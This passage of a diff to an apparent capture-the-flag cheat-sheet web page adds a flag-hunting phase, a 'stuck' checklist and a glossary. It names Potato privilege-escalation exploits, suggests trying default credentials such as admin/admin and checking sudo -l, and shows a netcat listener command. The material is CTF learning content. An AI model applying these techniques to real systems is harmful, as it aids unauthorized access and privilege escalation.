+                            <div class="callout-content">
+                                <div class="callout-title">Potato Attacks</div>
+                                If you have SeImpersonatePrivilege, try Potato exploits (JuicyPotato, PrintSpoofer, GodPotato) to get SYSTEM.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Phase 5: Capture the Flag -->
+            <section id="phase-5" class="phase-section open" data-phase="flag">
+                <div class="phase-header" onclick="togglePhase(this)">
+                    <div class="phase-icon">🚩</div>
+                    <div class="phase-header-content">
+                        <div class="phase-number">PHASE 5</div>
+                        <div class="phase-title">Capture the Flag</div>
+                        <div class="phase-subtitle">"Find and submit the flags"</div>
+                    </div>
+                    <span class="phase-toggle">COLLAPSE</span>
+                </div>
+                <div class="phase-content">
                     <div class="section-label">Common Flag Locations</div>
                     <div class="flag-locations">
                         <div class="flag-card">
                             <div class="flag-card-title"><span>🐧</span> Linux</div>
                             <div class="flag-path">/root/root.txt</div>
                             <div class="flag-path">/home/&lt;user&gt;/user.txt</div>
+                            <div class="flag-path">/home/&lt;user&gt;/Desktop/user.txt</div>
+                            <div class="flag-path">/var/www/flag.txt</div>
                         </div>
                         <div class="flag-card">
                             <div class="flag-card-title"><span>🪟</span> Windows</div>
-                            <div class="flag-path">C:\Users\Administrator\Desktop\</div>
-                            <div class="flag-path">C:\Users\&lt;user&gt;\Desktop\</div>
+                            <div class="flag-path">C:\Users\Administrator\Desktop\root.txt</div>
+                            <div class="flag-path">C:\Users\&lt;user&gt;\Desktop\user.txt</div>
+                            <div class="flag-path">C:\root.txt</div>
+                            <div class="flag-path">C:\Users\Public\Desktop\</div>
                         </div>
+                    </div>
+
+                    <div class="section-label">Search Commands</div>
+                    <div class="payload-block">
+                        <div class="payload-label">Linux — Find flag files</div>
+                        <div class="payload-code">find / -name "*.txt" 2>/dev/null | xargs grep -l "flag\|THM\|HTB" 2>/dev/null</div>
+                        <div class="payload-copy" onclick="copyPayload(this)">COPY</div>
+                    </div>
+
+                    <div class="payload-block">
+                        <div class="payload-label">Linux — Common flag names</div>
+                        <div class="payload-code">find / -name "*flag*" -o -name "*user*txt" -o -name "*root*txt" 2>/dev/null</div>
+                        <div class="payload-copy" onclick="copyPayload(this)">COPY</div>
+                    </div>
+
+                    <div class="payload-block">
+                        <div class="payload-label">Windows — Search for flag</div>
+                        <div class="payload-code">dir /s /b C:\*flag* C:\*user.txt C:\*root.txt 2>nul</div>
+                        <div class="payload-copy" onclick="copyPayload(this)">COPY</div>
                     </div>
 
                     <div class="checklist">
-                        <div class="checklist-title">✓ Checklist</div>
-                        <div class="checklist-item">
+                        <div class="checklist-title">✓ Final Checklist</div>
+                        <div class="checklist-item" data-id="user-flag">
                             <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Situational awareness complete</span>
+                            <span class="checklist-label">User flag captured</span>
                         </div>
-                        <div class="checklist-item">
+                        <div class="checklist-item" data-id="root-flag">
                             <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Privilege escalation vectors checked</span>
+                            <span class="checklist-label">Root/Admin flag captured</span>
                         </div>
-                        <div class="checklist-item">
+                        <div class="checklist-item" data-id="documented">
                             <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">User flag found</span>
-                        </div>
-                        <div class="checklist-item">
-                            <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
-                            <span class="checklist-label">Root/admin flag found</span>
+                            <span class="checklist-label">Full attack path documented</span>
                         </div>
                     </div>
                 </div>
             </section>
 
-            <!-- Phase 5: Documentation -->
-            <section id="docs" class="phase-section open" data-phase="docs">
-                <div class="phase-header" onclick="togglePhase(this)">
-                    <div class="phase-icon">📝</div>
-                    <div class="phase-header-content">
-                        <div class="phase-number">PHASE 5</div>
-                        <div class="phase-title">Documentation</div>
-                        <div class="phase-question">"What did I do?"</div>
-                    </div>
-                    <span class="phase-toggle">COLLAPSE</span>
+            <!-- Stuck Section -->
+            <section class="stuck-section">
+                <div class="stuck-header">
+                    <span class="stuck-icon">🔄</span>
+                    <h2 class="stuck-title">If You're Stuck</h2>
                 </div>
-                <div class="phase-content">
-                    <ul class="doc-list">
-                        <li>Screenshot everything important</li>
-                        <li>Note every command that worked</li>
-                        <li>Record timestamps</li>
-                        <li>Save credentials found</li>
-                        <li>Document the full path from start to flag</li>
-                    </ul>
+                <p style="color: var(--text-muted); margin-bottom: 20px;">Go back to basics. The answer is usually in something you missed, not something advanced.</p>
+
+                <div class="checklist" style="background: var(--bg-primary);">
+                    <div class="checklist-title">↻ Restart Checklist</div>
+                    <div class="checklist-item" data-id="stuck-allports">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I scan ALL ports? (<code>nmap -p-</code>)</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-udp">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I check UDP ports?</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-versions">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I Google every version number?</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-source">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I check page source code on all web pages?</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-creds">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I try default credentials? (admin/admin, root/root)</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-anon">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I check anonymous access? (FTP, SMB)</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-readfiles">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I read ALL files I found?</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-gobuster">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I try a bigger wordlist for gobuster?</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-linpeas">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I run LinPEAS/WinPEAS?</span>
+                    </div>
+                    <div class="checklist-item" data-id="stuck-sudol">
+                        <div class="checklist-checkbox" onclick="toggleCheck(this)"></div>
+                        <span class="checklist-label">Did I check <code>sudo -l</code>?</span>
+                    </div>
                 </div>
             </section>
 
-            <!-- Troubleshooting -->
-            <section class="troubleshooting-section">
-                <h2 class="troubleshooting-title">Quick Troubleshooting</h2>
-                <div class="reference-table">
+            <!-- Glossary -->
+            <section class="glossary-section">
+                <h2 class="glossary-title">Glossary</h2>
+                <div class="glossary-table">
                     <table>
                         <thead>
                             <tr>
-                                <th>Problem</th>
-                                <th>Try This</th>
+                                <th>Term</th>
+                                <th>What It Is</th>
                             </tr>
                         </thead>
                         <tbody>
                             <tr>
-                                <td>Nmap slow</td>
-                                <td>Use <code>-F</code> for fast scan, or <code>-p &lt;specific ports&gt;</code></td>
+                                <td>Reverse Shell</td>
+                                <td>A connection from the target back to your machine, giving you command-line access</td>
                             </tr>
                             <tr>
-                                <td>Can't reach target</td>
-                                <td>Check VPN connection, verify IP</td>
+                                <td>SUID</td>
+                                <td>File permission that runs the program as its owner (often root), regardless of who executes it</td>
                             </tr>
                             <tr>
-                                <td>Gobuster finds nothing</td>
-                                <td>Try different wordlist, check for redirects</td>
+                                <td>Privilege Escalation</td>
+                                <td>Moving from a low-level user account to root/administrator level access</td>
                             </tr>
                             <tr>
-                                <td>Exploit doesn't work</td>
-                                <td>Check versions match, try alternatives</td>
+                                <td>Banner Grab</td>
+                                <td>Connecting to a service to see what information it reveals (version, software name)</td>
                             </tr>
                             <tr>
-                                <td>Shell dies immediately</td>
-                                <td>Use a more stable shell, try different payload</td>
+                                <td>Enumeration</td>
+                                <td>Gathering detailed information about discovered services, users, and configurations</td>
+                            </tr>
+                            <tr>
+                                <td>CVE</td>
+                                <td>Common Vulnerabilities and Exposures — a standardized ID for known security flaws (e.g., CVE-2021-44228)</td>
+                            </tr>
+                            <tr>
+                                <td>RCE</td>
+                                <td>Remote Code Execution — ability to run commands on a target system remotely</td>
+                            </tr>
+                            <tr>
+                                <td>LinPEAS / WinPEAS</td>
+                                <td>Automated scripts that search for privilege escalation vectors on Linux/Windows</td>
+                            </tr>
+                            <tr>
+                                <td>GTFOBins</td>
+                                <td>Website listing Unix binaries that can be exploited for privilege escalation</td>
+                            </tr>
+                            <tr>
+                                <td>Payload</td>
+                                <td>The code or command that performs the actual exploit action (e.g., spawns a shell)</td>
+                            </tr>
+                            <tr>
+                                <td>Listener</td>
+                                <td>A program waiting for incoming connections (like nc -lvnp 4444)</td>
                             </tr>
                         </tbody>
                     </table>
@@ -707,6 +1444,7 @@
     </div>
 
     <script>
+        // Navigation dropdown
         function toggleDropdown(btn) {
             const dropdown = btn.parentElement;
             const wasOpen = dropdown.classList.contains('open');
@@ -719,6 +1457,7 @@
             }
         });
 
+        // Phase toggle
         function togglePhase(header) {
             const section = header.closest('.phase-section');
             section.classList.toggle('open');
@@ -726,13 +1465,84 @@
             toggle.textContent = section.classList.contains('open') ? 'COLLAPSE' : 'EXPAND';
         }
 
+        // Service card toggle
+        function toggleService(header) {
+            const card = header.closest('.service-card');
+            card.classList.toggle('open');
+            const toggle = header.querySelector('.service-toggle');
+            toggle.textContent = card.classList.contains('open') ? 'COLLAPSE' : 'EXPAND';
+        }
+
+        // Open specific service card from decision tree
+        function openService(serviceId) {
+            const card = document.getElementById('service-' + serviceId);
+            if (card) {
+                // Close all service cards first
+                document.querySelectorAll('.service-card').forEach(c => {
+                    c.classList.remove('open');
+                    c.querySelector('.service-toggle').textContent = 'EXPAND';
+                });
+                // Open the selected one
+                card.classList.add('open');
+                card.querySelector('.service-toggle').textContent = 'COLLAPSE';
+                // Scroll to it
+                card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+        }
+
+        // Checklist toggle with localStorage persistence
         function toggleCheck(checkbox) {
             checkbox.classList.toggle('checked');
             checkbox.closest('.checklist-item').classList.toggle('checked');
+            
+            // Save state
+            const id = checkbox.closest('.checklist-item').dataset.id;
+            if (id) {
+                const checked = checkbox.classList.contains('checked');
+                localStorage.setItem('ctf-check-' + id, checked);
+            }
+        }
+
+        // Load checklist state on page load
+        function loadChecklistState() {
+            document.querySelectorAll('.checklist-item[data-id]').forEach(item => {
+                const id = item.dataset.id;
+                const checked = localStorage.getItem('ctf-check-' + id) === 'true';
+                if (checked) {
+                    item.classList.add('checked');
+                    item.querySelector('.checklist-checkbox').classList.add('checked');
+                }
+            });
+        }
+
+        // Copy command to clipboard
+        function copyCommand(btn) {
+            const code = btn.parentElement.querySelector('code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'COPIED!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = 'COPY';
+                    btn.classList.remove('copied');
+                }, 2000);
+            });
+        }
+
+        // Copy payload to clipboard
+        function copyPayload(btn) {
+            const code = btn.parentElement.querySelector('.payload-code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'COPIED!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = 'COPY';
+                    btn.classList.remove('copied');
+                }, 2000);
+            });
         }
 
         // Smooth scroll for flow diagram links
-        document.querySelectorAll('.flow-phase').forEach(link => {
+        document.querySelectorAll('.flow-step').forEach(link => {
             link.addEventListener('click', (e) => {
                 e.preventDefault();
                 const target = document.querySelector(link.getAttribute('href'));
@@ -747,7 +1557,9 @@
                 }
             });
         });
+
+        // Initialize
+        loadChecklistState();
     </script>
 </body>
 </html>
-
